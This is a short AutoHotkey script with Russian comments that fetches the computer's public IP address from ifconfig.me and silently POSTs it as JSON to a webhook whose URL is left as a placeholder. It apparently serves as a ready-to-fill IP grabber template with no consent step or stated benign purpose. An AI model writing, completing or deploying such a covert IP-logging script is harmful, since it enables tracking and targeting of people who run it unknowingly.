; Получить IP
oHTTP := ComObjCreate("WinHttp.WinHttpRequest.5.1")
oHTTP.Open("GET", "http://ifconfig.me/ip", false)
oHTTP.Send()
IPAddress := oHTTP.ResponseText

Message := "{""content"": ""IP: " . IPAddress . """}"

;Отправить сообщение на вебхук
WebhookURL := "сюда вебхук"
oHTTP := ComObjCreate("WinHttp.WinHttpRequest.5.1")
oHTTP.Open("POST", WebhookURL, false)
oHTTP.SetRequestHeader("Content-Type", "application/json")
oHTTP.Send(Message)
